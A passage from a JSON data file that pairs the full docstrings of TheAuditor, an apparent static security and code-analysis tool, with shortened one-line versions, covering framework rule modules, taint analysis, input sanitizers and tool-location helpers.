    "original": "\"\"\"React Framework Security Analyzer - Database-First Approach.\n\nAnalyzes React applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"React Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/frameworks/vue_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue.js Framework Security Analyzer - Database-First Approach.\n\nAnalyzes Vue.js applications for security vulnerabilities using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Vue.js Framework Security Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/injection.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect GraphQL injection via taint analysis.\n\n    Strategy:\n    1. Get all GraphQL field arguments (untrusted sources)\n    2. For each argument, check if it flows to dangerous sinks\n    3. Look for SQL queries (sql_queries table) or command execution\n    4. Check if sanitization exists between source and sink\n    5. Report unsanitized flows as injection vulnerabilities\n\n    NO FALLBACKS. Database must exist.\n    \"\"\"",
    "truncated": "\"\"\"Detect GraphQL injection via taint analysis.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/nplus1.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect N+1 query patterns in GraphQL resolvers.\n\n    Strategy:\n    1. Find list-returning GraphQL fields (is_list=1)\n    2. Get their child field resolvers\n    3. Check if child resolvers have loops in CFG\n    4. Check if those loops contain DB queries\n    5. Report N+1 pattern\n\n    NO FALLBACKS. Database must exist.\n    \"\"\"",
    "truncated": "\"\"\"Detect N+1 query patterns in GraphQL resolvers.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Execute a single rule with appropriate parameters.\n\n        Now handles both standardized and legacy rules (Phase 1 dual-mode).\n\n        Args:\n            rule: RuleInfo object describing the rule\n            context: RuleContext with available data\n\n        Returns:\n            List of findings from the rule\n        \"\"\"",
    "truncated": "\"\"\"Execute a single rule with appropriate parameters.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Check taint using REAL taint analysis results.\n\n        This provides rules with a way to check if variables are tainted\n        using the main taint analyzer's cached results.\n\n        Args:\n            context: The rule execution context\n\n        Returns:\n            A function that checks if a variable is tainted\n        \"\"\"",
    "truncated": "\"\"\"Check taint using REAL taint analysis results.\"\"\""
  },
  {
    "file": "theauditor/rules/orchestrator.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Return cached taint paths relevant to location.\n\n                Args:\n                    source_var: The variable to trace\n                    source_file: File containing the variable\n                    source_line: Line where the variable is defined\n                    source_function: Function containing the variable (optional)\n\n                Returns:\n                    List of relevant taint paths from cached results\n                \"\"\"",
    "truncated": "\"\"\"Return cached taint paths relevant to location.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/prisma_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Prisma ORM Analyzer - Database-First Approach.\n\nDetects Prisma ORM anti-patterns and performance issues using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Prisma ORM Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/orm/typeorm_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"TypeORM Analyzer - Database-First Approach.\n\nDetects TypeORM anti-patterns and performance issues using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"TypeORM Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/performance/perf_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Performance Analyzer - Database-First Approach.\n\nDetects performance anti-patterns and inefficiencies using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows golden standard patterns:\n- Frozensets for O(1) pattern matching\n- Direct database queries (fail-fast on missing tables)\n- Schema contract compliance (v1.1+ - uses build_query())\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Performance Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/python/__init__.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Python-specific security and concurrency rules.\n\nThis module contains rules for detecting Python-specific issues:\n- Race conditions and concurrency problems\n- Async/await issues\n- Threading and multiprocessing problems\n- Lock and synchronization issues\n- Cryptography vulnerabilities\n- Injection vulnerabilities (SQL, command, code, template, etc.)\n- Deserialization vulnerabilities (pickle, YAML, marshal, etc.)\n\"\"\"",
    "truncated": "\"\"\"Python-specific security and concurrency rules.\"\"\""
  },
  {
    "file": "theauditor/rules/python/async_concurrency_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Python Async and Concurrency Analyzer - Database-First Approach.\n\nDetects race conditions, async issues, and concurrency problems using ONLY\nindexed database data. NO AST traversal. NO file I/O. Pure SQL queries.\n\nFollows schema contract architecture (v1.1+):\n- Frozensets for all patterns (O(1) lookups)\n- Schema-validated queries via build_query()\n- Assume all contracted tables exist (crash if missing)\n- Proper confidence levels\n\"\"\"",
    "truncated": "\"\"\"Python Async and Concurrency Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/react/component_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect React component anti-patterns and best practices violations.\n\n    Uses data from react_components and related tables for accurate detection\n    of component structure, organization, and performance issues.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of React component issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect React component anti-patterns and best practices violations.\"\"\""
  },
  {
    "file": "theauditor/rules/react/hooks_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect React hooks violations and anti-patterns.\n\n    Uses real data from react_hooks, react_components, and variable_usage\n    tables for accurate detection instead of broken heuristics.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of React hooks violations found\n    \"\"\"",
    "truncated": "\"\"\"Detect React hooks violations and anti-patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/react/render_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect React rendering performance issues and anti-patterns.\n\n    Uses data from function_call_args and react tables to identify\n    rendering bottlenecks and optimization opportunities.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of React rendering issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect React rendering performance issues and anti-patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/react/state_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Detect React state management issues and anti-patterns.\n\n    Uses data from react_hooks and related tables to identify state\n    complexity, prop drilling, and management issues.\n\n    Args:\n        context: Standardized rule context with database path\n\n    Returns:\n        List of React state management issues found\n    \"\"\"",
    "truncated": "\"\"\"Detect React state management issues and anti-patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Split identifiers into normalized, lowercase tokens.\n\n    Handles camelCase, snake_case, kebab-case, and mixed patterns.\n    Prevents substring collisions like \"includes\" matching \"DES\".\n\n    Examples:\n        >>> _split_identifier_tokens(\"createDES3Cipher\")\n        ['create', 'des3', 'cipher']\n        >>> _split_identifier_tokens(\"c.path.includes\")\n        ['c', 'path', 'includes']\n    \"\"\"",
    "truncated": "\"\"\"Split identifiers into normalized, lowercase tokens.\"\"\""
  },
  {
    "file": "theauditor/rules/security/crypto_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Check if the identifier or argument contains a crypto alias token.\n\n    Uses token-based matching to prevent false positives from substring collisions.\n    Credit: @dev-corelift (PR #20)\n\n    Examples:\n        >>> _contains_alias(\"c.path.includes\", \"des\")\n        False  # \"includes\" doesn't contain \"des\" as a token\n        >>> _contains_alias(\"createDES3Cipher\", \"des3\")\n        True  # \"des3\" exists as a distinct token\n    \"\"\"",
    "truncated": "\"\"\"Check if the identifier or argument contains a crypto alias token.\"\"\""
  },
  {
    "file": "theauditor/rules/security/pii_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Split an identifier or arbitrary string into normalized tokens.\n\n    Handles camelCase, snake_case, kebab-case, and mixed patterns.\n    Prevents substring collisions like \"message\" matching \"sms_history\".\n\n    Examples:\n        >>> _split_identifier_tokens(\"className\")\n        ['class', 'name']\n        >>> _split_identifier_tokens(\"sms_history\")\n        ['sms', 'history']\n    \"\"\"",
    "truncated": "\"\"\"Split an identifier or arbitrary string into normalized tokens.\"\"\""
  },
  {
    "file": "theauditor/rules/terraform/terraform_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Terraform IaC Security Analyzer - database-first rule.\n\nDetects infrastructure security issues by querying Terraform extractor tables:\n- terraform_resources\n- terraform_variables\n- terraform_variable_values (.tfvars)\n- terraform_outputs\n\nThe rule mirrors the legacy TerraformAnalyzer checks while exposing findings via\nStandardFinding so orchestrator and CLI can share a single source of truth.\n\"\"\"",
    "truncated": "\"\"\"Terraform IaC Security Analyzer - database-first rule.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/component_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue Component Analyzer - Database-First Approach.\n\nDetects Vue-specific component anti-patterns and performance issues using\nindexed database data. NO AST traversal. Pure SQL queries.\n\nFollows v1.1+ gold standard patterns:\n- Frozensets for all patterns (O(1) lookups)\n- NO table existence checks (schema contract guarantees all tables exist)\n- Direct database queries (crash on missing tables to expose indexer bugs)\n- Proper confidence levels via Confidence enum\n\"\"\"",
    "truncated": "\"\"\"Vue Component Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/hooks_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue Composition API Hooks Analyzer - Database-First Approach.\n\nDetects Vue 3 Composition API misuse and hook-related issues using\nindexed database data. NO AST traversal. Pure SQL queries.\n\nFollows v1.1+ gold standard patterns:\n- Frozensets for all patterns (O(1) lookups)\n- NO table existence checks (schema contract guarantees all tables exist)\n- Direct database queries (crash on missing tables to expose indexer bugs)\n- Proper confidence levels via Confidence enum\n\"\"\"",
    "truncated": "\"\"\"Vue Composition API Hooks Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/lifecycle_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue Lifecycle Analyzer - Database-First Approach.\n\nDetects Vue lifecycle hook misuse and anti-patterns using\nindexed database data. NO AST traversal. Pure SQL queries.\n\nFollows v1.1+ gold standard patterns:\n- Frozensets for all patterns (O(1) lookups)\n- NO table existence checks (schema contract guarantees all tables exist)\n- Direct database queries (crash on missing tables to expose indexer bugs)\n- Proper confidence levels via Confidence enum\n\"\"\"",
    "truncated": "\"\"\"Vue Lifecycle Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/reactivity_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Find direct props mutations using database queries.\n\n    Schema contract guarantees:\n    - vue_components table exists with props_definition column\n    - assignments table exists with file, line, target_var columns\n\n    Strategy:\n    1. Query vue_components for files with props\n    2. Parse props_definition JSON to get prop names\n    3. Join with assignments to find mutations\n    \"\"\"",
    "truncated": "\"\"\"Find direct props mutations using database queries.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/render_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue Render Analyzer - Database-First Approach.\n\nDetects Vue rendering anti-patterns and performance issues using\nindexed database data. NO AST traversal. Pure SQL queries.\n\nFollows v1.1+ gold standard patterns:\n- Frozensets for all patterns (O(1) lookups)\n- NO table existence checks (schema contract guarantees all tables exist)\n- Direct database queries (crash on missing tables to expose indexer bugs)\n- Proper confidence levels via Confidence enum\n\"\"\"",
    "truncated": "\"\"\"Vue Render Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/rules/vue/state_analyze.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Vue State Management Analyzer - Database-First Approach.\n\nDetects Vuex and Pinia state management anti-patterns and issues using\nindexed database data. NO AST traversal. Pure SQL queries.\n\nFollows v1.1+ gold standard patterns:\n- Frozensets for all patterns (O(1) lookups)\n- NO table existence checks (schema contract guarantees all tables exist)\n- Direct database queries (crash on missing tables to expose indexer bugs)\n- Proper confidence levels via Confidence enum\n\"\"\"",
    "truncated": "\"\"\"Vue State Management Analyzer - Database-First Approach.\"\"\""
  },
  {
    "file": "theauditor/security.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Sanitize a string for safe use as a shell argument.\n\n    Uses shlex.quote to properly escape special characters and prevent command injection.\n\n    Args:\n        arg: The argument string to sanitize\n\n    Returns:\n        A properly quoted/escaped string safe for shell use\n    \"\"\"",
    "truncated": "\"\"\"Sanitize a string for safe use as a shell argument.\"\"\""
  },
  {
    "file": "theauditor/security.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Sanitize a string for safe use in URL construction.\n\n    Properly encodes special characters to prevent URL injection.\n\n    Args:\n        component: The URL component to sanitize (e.g., package name)\n\n    Returns:\n        A properly URL-encoded string\n    \"\"\"",
    "truncated": "\"\"\"Sanitize a string for safe use in URL construction.\"\"\""
  },
  {
    "file": "theauditor/session/analyzer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n        Detect when AI references comments that may not match reality.\n\n        This detects the \"hallucination feedback loop\" where:\n        1. AI reads a comment\n        2. AI says \"this comment says X\"\n        3. The comment actually said Y (or was misleading)\n        4. AI makes decisions based on hallucinated understanding\n\n        Cross-references against comment_graveyard.json if available.\n        \"\"\"",
    "truncated": "\"\"\"Detect when AI references comments that may not match reality.\"\"\""
  },
  {
    "file": "theauditor/session/diff_scorer.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Aggregate scores from all analyses into single risk score.\n\n        Args:\n            taint: Taint analysis score\n            patterns: Pattern detection score\n            fce: FCE completeness score\n            rca: RCA historical risk score\n\n        Returns:\n            Aggregate risk score (0.0-1.0)\n        \"\"\"",
    "truncated": "\"\"\"Aggregate scores from all analyses into single risk score.\"\"\""
  },
  {
    "file": "theauditor/taint/access_path.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Convert to set of patterns for legacy taint matching.\n\n        Returns all prefixes for substring matching in existing code.\n\n        Returns:\n            Set of pattern strings: {\"req\", \"req.body\", \"req.body.userId\"}\n\n        Examples:\n            >>> AccessPath(..., base=\"req\", fields=(\"body\", \"userId\")).to_pattern_set()\n            {\"req\", \"req.body\", \"req.body.userId\"}\n        \"\"\"",
    "truncated": "\"\"\"Convert to set of patterns for legacy taint matching.\"\"\""
  },
  {
    "file": "theauditor/taint/flow_resolver.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get all entry points from the unified graph.\n\n        Entry points include:\n            - HTTP request sources (req.body, req.params, req.query) - DIRECT GRAPH QUERY\n            - API endpoints (cross_boundary edge targets)\n            - Environment variable accesses\n            - Main/index file exports\n\n        Returns:\n            List of node IDs (format: file::function::variable)\n        \"\"\"",
    "truncated": "\"\"\"Get all entry points from the unified graph.\"\"\""
  },
  {
    "file": "theauditor/taint/type_resolver.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get model name for a node from metadata.\n\n        Queries the nodes table in graphs.db and parses the metadata JSON\n        to find the 'model' key.\n\n        Args:\n            node_id: Node ID in format 'file::scope::variable'\n\n        Returns:\n            Model name if found, None otherwise\n        \"\"\"",
    "truncated": "\"\"\"Get model name for a node from metadata.\"\"\""
  },
  {
    "file": "theauditor/terraform/graph.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Build provisioning flow graph from Terraform data.\n\n        Queries terraform_* tables to construct a graph showing how\n        variables flow through resources to outputs.\n\n        Args:\n            root: Project root (for metadata only)\n\n        Returns:\n            Dict with nodes, edges, and metadata (same format as DFGBuilder)\n        \"\"\"",
    "truncated": "\"\"\"Build provisioning flow graph from Terraform data.\"\"\""
  },
  {
    "file": "theauditor/utils/code_snippets.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Read source code lines with LRU caching and safety limits.\n\n    Language agnostic - works with Python, JavaScript, TypeScript, Rust, Go, Vue, etc.\n    Block expansion uses indentation-based heuristics that work across languages.\n\n    Safety limits:\n    - Max file size: 1MB (skip larger files)\n    - Max cache size: 20 files\n    - Max snippet lines: 15\n    - Max line length: 120 chars (truncate with ...)\n    \"\"\"",
    "truncated": "\"\"\"Read source code lines with LRU caching and safety limits.\"\"\""
  },
  {
    "file": "theauditor/utils/exit_codes.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Standard exit codes for TheAuditor CLI commands.\n\n    These codes follow a semantic pattern:\n    - 0: Complete success, no issues found\n    - 1: Command executed but found issues requiring attention\n    - 2: Command executed but found critical/security issues\n    - 3: Command could not complete its intended task\n    - 4+: Reserved for future use\n\n    This aligns with Unix conventions where 0 = success and non-zero = various failure modes.\n    \"\"\"",
    "truncated": "\"\"\"Standard exit codes for TheAuditor CLI commands.\"\"\""
  },
  {
    "file": "theauditor/utils/finding_priority.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Normalize severity from various formats to standard string.\n\n    Handles integers (Docker), floats (ML confidence), strings (ESLint),\n    and missing values (test failures).\n\n    Args:\n        severity_value: Can be int, float, string, or None\n\n    Returns:\n        Normalized severity string from PRIORITY_ORDER keys\n    \"\"\"",
    "truncated": "\"\"\"Normalize severity from various formats to standard string.\"\"\""
  },
  {
    "file": "theauditor/utils/meta_findings.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"\n    Format a dependency cycle into findings (one per file in cycle).\n\n    Args:\n        cycle: Cycle dict from graph analyzer with fields:\n               - nodes: List of files in cycle\n               - size: Number of nodes in cycle\n\n    Returns:\n        List of formatted findings, one per file in cycle\n    \"\"\"",
    "truncated": "\"\"\"Format a dependency cycle into findings (one per file in cycle).\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get path to bundled Node.js executable.\n\n        Args:\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            Path to node executable, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and not found\n        \"\"\"",
    "truncated": "\"\"\"Get path to bundled Node.js executable.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get npm command for running npm operations.\n\n        Args:\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            List of command components to run npm, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and not found\n        \"\"\"",
    "truncated": "\"\"\"Get npm command for running npm operations.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get path to ESLint binary in sandbox.\n\n        Args:\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            Path to ESLint binary, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and not found\n        \"\"\"",
    "truncated": "\"\"\"Get path to ESLint binary in sandbox.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get path to TypeScript compiler (tsc) in sandbox.\n\n        Args:\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            Path to tsc binary, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and not found\n        \"\"\"",
    "truncated": "\"\"\"Get path to TypeScript compiler (tsc) in sandbox.\"\"\""
  },
  {
    "file": "theauditor/utils/toolbox.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Get path to OSV-Scanner binary.\n\n        Args:\n            required: If True, raise FileNotFoundError when missing\n\n        Returns:\n            Path to osv-scanner executable, or None if not required and not found\n\n        Raises:\n            FileNotFoundError: If required=True and not found in either location\n        \"\"\"",
    "truncated": "\"\"\"Get path to OSV-Scanner binary.\"\"\""
  },
  {
    "file": "theauditor/vulnerability_scanner.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Run OSV-Scanner using bundled binary.\n\n        FACTS (from usage.md):\n        - Scan lockfiles: osv-scanner scan -L package-lock.json -L requirements.txt\n        - Output format: --format json\n        - Offline mode: --offline-vulnerabilities\n        - Database location: env var OSV_SCANNER_LOCAL_DB_CACHE_DIRECTORY\n\n        Returns:\n            List of vulnerability findings from OSV-Scanner\n        \"\"\"",
    "truncated": "\"\"\"Run OSV-Scanner using bundled binary.\"\"\""
  },
  {
    "file": "theauditor/workset.py",
    "line": -1,
    "original_lines": 11,
    "original": "\"\"\"Validate and parse git diff spec to prevent command injection.\n\n    Args:\n        diff_spec: Git diff specification (e.g., 'main..feature', 'HEAD~5')\n\n    Returns:\n        List of validated parts for git diff command\n\n    Raises:\n        ValueError: If diff spec contains potentially malicious characters\n    \"\"\"",
    "truncated": "\"\"\"Validate and parse git diff spec to prevent command injection.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Terraform resources with line numbers.\n\n    Args:\n        tree: tree-sitter parse tree (with .root_node)\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of resource dicts with type, name, line, attributes\n    \"\"\"",
    "truncated": "\"\"\"Extract Terraform resources with line numbers.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Terraform variables with line numbers and attributes.\n\n    Args:\n        tree: tree-sitter parse tree (with .root_node)\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of variable dicts with name, line, and attributes (type, sensitive, default, description)\n    \"\"\"",
    "truncated": "\"\"\"Extract Terraform variables with line numbers and attributes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Terraform outputs with line numbers and attributes.\n\n    Args:\n        tree: tree-sitter parse tree (with .root_node)\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of output dicts with name, line, and attributes (value, sensitive, description)\n    \"\"\"",
    "truncated": "\"\"\"Extract Terraform outputs with line numbers and attributes.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Terraform data sources with line numbers.\n\n    Args:\n        tree: tree-sitter parse tree (with .root_node)\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of data source dicts with type, name, line\n    \"\"\"",
    "truncated": "\"\"\"Extract Terraform data sources with line numbers.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/hcl_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"HCL AST extraction using tree-sitter.\n\nExtracts resources, variables, and outputs from Terraform/HCL files with precise\nline numbers using tree-sitter-hcl.\n\nArchitecture:\n- Database-first: Returns structured data for direct database insertion\n- Zero fallbacks: Hard fail on parse errors\n- Line precision: Uses tree-sitter node.start_point for exact locations\n\"\"\"",
    "truncated": "\"\"\"HCL AST extraction using tree-sitter.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/cfg_extractor.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Process a statement and update CFG.\n\n    Args:\n        stmt: Statement AST node\n        current_block_id: Current block ID\n        get_next_block_id: Function to get next block ID\n\n    Returns:\n        Tuple of (new_blocks, new_edges, next_block_id) or None\n    \"\"\"",
    "truncated": "\"\"\"Process a statement and update CFG.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/core_extractors.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Python function calls with argument mapping.\n\n    Args:\n        context: FileContext containing AST tree and node index\n        function_params: Map of function names to parameter lists (optional)\n        resolved_imports: Map of imported names to their file paths (for cross-file taint analysis)\n\n    Returns:\n        List of call records with callee_file_path populated for local imports\n    \"\"\"",
    "truncated": "\"\"\"Extract Python function calls with argument mapping.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/exception_flow_extractors.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect exception handling strategy from handler body.\n\n    Strategies:\n    - 'return_none': except: return None\n    - 're_raise': except: raise\n    - 'log_and_continue': except: logging.error(...); pass\n    - 'convert_to_other': except ValueError: raise TypeError\n    - 'pass': except: pass\n    - 'other': Complex handling logic\n    \"\"\"",
    "truncated": "\"\"\"Detect exception handling strategy from handler body.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/fundamental_extractors.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect variables captured from outer scope in lambda.\n\n    Args:\n        lambda_node: The lambda AST node\n        function_ranges: List of function ranges for context\n        all_nodes: All AST nodes in the tree (for scope analysis)\n\n    Returns:\n        List of variable names captured from outer scope\n    \"\"\"",
    "truncated": "\"\"\"Detect variables captured from outer scope in lambda.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/python/utils/node_index.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get nodes of type within line range.\n\n        Args:\n            node_type: Type of nodes to find\n            start_line: Start line (inclusive)\n            end_line: End line (inclusive)\n\n        Returns:\n            List of matching nodes in range\n        \"\"\"",
    "truncated": "\"\"\"Get nodes of type within line range.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract function definitions from Rust AST.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of function dicts with name, line, params, return_type\n    \"\"\"",
    "truncated": "\"\"\"Extract function definitions from Rust AST.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract pub items (Rust's export mechanism).\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of export dicts\n    \"\"\"",
    "truncated": "\"\"\"Extract pub items (Rust's export mechanism).\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract function calls and macro invocations.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        List of call dicts\n    \"\"\"",
    "truncated": "\"\"\"Extract function calls and macro invocations.\"\"\""
  },
  {
    "file": "theauditor/ast_extractors/rust_impl.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract function parameter names.\n\n    Args:\n        tree: tree-sitter parse tree\n        content: File content\n        file_path: Path to source file\n\n    Returns:\n        Dict mapping function_name -> [param_names]\n    \"\"\"",
    "truncated": "\"\"\"Extract function parameter names.\"\"\""
  },
  {
    "file": "theauditor/ast_parser.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Parse code using Tree-sitter with caching based on content hash.\n\n        Args:\n            content_hash: MD5 hash of the file content\n            content: The actual file content as bytes\n            language: The programming language\n\n        Returns:\n            Parsed Tree-sitter tree\n        \"\"\"",
    "truncated": "\"\"\"Parse code using Tree-sitter with caching based on content hash.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Run full dead code analysis.\n\n        Args:\n            path_filter: Optional SQL LIKE pattern (e.g., 'src/%')\n            exclude_patterns: Paths to skip\n            analyze_symbols: Enable symbol-level (function/class) analysis\n\n        Returns:\n            List of DeadCode findings with cluster IDs\n        \"\"\"",
    "truncated": "\"\"\"Run full dead code analysis.\"\"\""
  },
  {
    "file": "theauditor/context/deadcode_graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Multi-strategy entry point detection.\n\n        Strategies:\n        1. Pattern-based (cli.py, main.py, __main__.py, index.*)\n        2. Decorator-based (@app.route, @task, @click.command)\n        3. Framework-based (React routes, Vue routes)\n        4. Test files (test_*.py, *.test.js)\n\n        NO FALLBACK - crashes if tables malformed.\n        \"\"\"",
    "truncated": "\"\"\"Multi-strategy entry point detection.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Format file explain output.\n\n        Args:\n            data: File context bundle from CodeQueryEngine.get_file_context_bundle()\n                  Contains: target, target_type, symbols, hooks, imports,\n                           importers, outgoing_calls, incoming_calls\n\n        Returns:\n            Formatted text output\n        \"\"\"",
    "truncated": "\"\"\"Format file explain output.\"\"\""
  },
  {
    "file": "theauditor/context/explain_formatter.py",
    "line": -1,
    "original_lines": 10,
